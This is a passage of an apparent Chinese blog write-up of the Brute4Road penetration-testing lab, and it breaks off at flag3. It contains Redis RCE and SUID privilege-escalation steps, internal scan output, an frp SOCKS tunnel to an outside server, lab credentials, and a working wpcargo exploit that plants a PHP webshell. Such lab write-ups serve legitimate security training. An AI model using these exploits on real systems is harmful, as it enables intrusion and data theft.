@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="flag1首先用fscan扫描拿到的ip   发现6379端口开启，存在redis未授权，接下来用工具尝试连接，成功。   接下来尝试redis主从复制rce 1    成功反弹shell，尝试去读取flag时发现权限不足。  那么接下来我们要做的就是提权。先看看SUID提权 1find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null    发现存在b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Brute4Road wp">
+<meta property="og:url" content="http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/index.html">
+<meta property="og:site_name" content="Meteor_Kai">
+<meta property="og:description" content="flag1首先用fscan扫描拿到的ip   发现6379端口开启，存在redis未授权，接下来用工具尝试连接，成功。   接下来尝试redis主从复制rce 1    成功反弹shell，尝试去读取flag时发现权限不足。  那么接下来我们要做的就是提权。先看看SUID提权 1find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null    发现存在b">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607205754240.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607205847501.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607210655543.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607210847799.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607211054638.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607211309550.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607211517959.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212441656.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212545614.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212812618.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212844742.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212932306.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607214959322.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607215455357.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220014655.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220002896.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220346292.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220712302.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220827621.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607222759035.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607223936180.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607224045204.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607231249099.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607231557028.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608145021979.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608145859064.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608153740715.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608154039777.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608154411750.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608162250083.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608163849061.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608163926923.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608164008731.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608164147064.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608165408565.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608165055072.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608165308875.png">
+<meta property="article:published_time" content="2025-06-08T08:58:01.000Z">
+<meta property="article:modified_time" content="2025-06-08T08:58:44.374Z">
+<meta property="article:author" content="Meteor_Kai">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607205754240.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云镜-Brute4Road wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/03/D-3CTF-2025-Web-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&text=春秋云镜-Brute4Road wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&is_video=false&description=春秋云镜-Brute4Road wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜-Brute4Road wp&body=Check out this article: http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&name=春秋云镜-Brute4Road wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&t=春秋云镜-Brute4Road wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">3.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">4.</span> <span class="toc-text">flag4</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云镜-Brute4Road wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Meteor_Kai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-08T08:58:01.000Z" class="dt-published" itemprop="datePublished">2025-06-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/wp/" rel="tag">wp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>首先用fscan扫描拿到的ip</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607205754240.png" alt="image-20250607205754240" style="zoom:80%;" />
+
+<p>发现<code>6379</code>端口开启，存在redis未授权，接下来用工具尝试连接，成功。</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607205847501.png" alt="image-20250607205847501" style="zoom:80%;" />
+
+<p>接下来尝试redis主从复制rce</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607210655543.png" alt="image-20250607210655543" style="zoom:80%;" />
+
+<p>成功反弹shell，尝试去读取flag时发现权限不足。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607210847799.png" alt="image-20250607210847799"></p>
+<p>那么接下来我们要做的就是提权。先看看<code>SUID</code>提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607211054638.png" alt="image-20250607211054638" style="zoom:80%;" />
+
+<p>发现存在base64可用，可以用来读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/base64 flag01 | base64 -d</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607211309550.png" alt="image-20250607211309550" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ed872d22-5b31-474e-8a37-9dbacb526d08&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>这个机子的flag已经拿到了，那么我们接下来需要上传fscan来进行内网的扫描。</p>
+<p>我们cd到&#x2F;tmp目录下下载fscan，其他目录可能没有权限。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607211517959.png" alt="image-20250607211517959"></p>
+<p>接下来我输入<code>ifconfig</code>时发现命令不存在，那么用<code>hostname -i</code>来试试，发现回显<code>172.22.2.7</code>，用fscan扫一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.7/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">[*] alive ports len is: 20</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.3</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.22.2.3</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.16</span><br><span class="line">   [-&gt;]MSSQLSERVER</span><br><span class="line">   [-&gt;]172.22.2.16</span><br><span class="line">[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.34</span><br><span class="line">   [-&gt;]CLIENT01</span><br><span class="line">   [-&gt;]172.22.2.34</span><br><span class="line">[*] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.2.16  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.2.3   (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[+] ftp 172.22.2.7:21:anonymous </span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点</span><br><span class="line">已完成 20/20</span><br><span class="line">[*] 扫描结束,耗时: 12.75707225s</span><br></pre></td></tr></table></figure>
+
+<p>有五个存活主机。发现<code>172.22.2.18</code>为web2主机（WordPress站点），<code>172.22.2.3</code>为DC域控，<code>172.22.2.16</code>为MSSQLSERVER，<code>172.22.2.34</code>可能是成员主机CLIENT01？</p>
+<p>我们先搭建frp隧道。往web01主机上传<code>frpc</code>和<code>frpc.toml</code></p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212441656.png" alt="image-20250607212441656" style="zoom:80%;" />
+
+<p>然后我们先配置frps，看看<code>frps.toml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bindPort = 7000</span><br></pre></td></tr></table></figure>
+
+<p>开启frps</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212545614.png" alt="image-20250607212545614"></p>
+<p>接着连接一下frpc，看一下<code>frpc.toml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 156.238.233.113</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[plugin_socks6]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 5001</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212812618.png" alt="image-20250607212812618" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212844742.png" alt="image-20250607212844742" style="zoom:80%;" />
+
+<p>同时我们配置一下代理规则</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607212932306.png" alt="image-20250607212932306" style="zoom:80%;" />
+
+<p>然后尝试去访问<code>172.22.2.18</code>发现成功访问，既然是<code>wordpress</code>站点，那么可以用<code>wpscan</code>扫描。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 wpscan --url http://172.22.2.18</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607214959322.png" alt="image-20250607214959322"></p>
+<p>发现<code>wpcargo</code>这个插件存在漏洞。</p>
+<p>漏洞分析文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/0x28/p/16562596.html">https://www.cnblogs.com/0x28/p/16562596.html</a></p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_character_code</span>(<span class="params">c: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;ls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>exp执行后的回显如下：</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607215455357.png" alt="image-20250607215455357" style="zoom:80%;" />
+
+<p>这里我看了一下<code>/home</code>下不存在其他用户，flag也没有在根目录下，那么flag可能藏在数据库里。</p>
+<p>那么木马就成功写入了，连接一下webshell管理工具中国蚁剑。</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220014655.png" alt="image-20250607220014655" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220002896.png" alt="image-20250607220002896" style="zoom:80%;" />
+
+<p>翻到了数据库的相关配置文件：</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220346292.png" alt="image-20250607220346292" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpuser WpuserEha8Fgj9</span><br></pre></td></tr></table></figure>
+
+<p>接着我们连接一下数据库：</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220712302.png" alt="image-20250607220712302" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607220827621.png" alt="image-20250607220827621" style="zoom:80%;" />
+
+<p>获得第二个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c757e423-eb44-459c-9c63-7625009910d8&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>上面的SomeThingYouMightInterested数据表给了一个password列，可能是需要我们接下来拿去爆破的？接下来的目标还剩下一个MSSQL和DC，那个<code>.34 Client</code>连80端口都没开，有点奇怪，我们先不管它。</p>
+<p>那么这里获得的密码字典可能就是MSSQL的密码爆破字典。</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607222759035.png" alt="image-20250607222759035" style="zoom:80%;" />
+
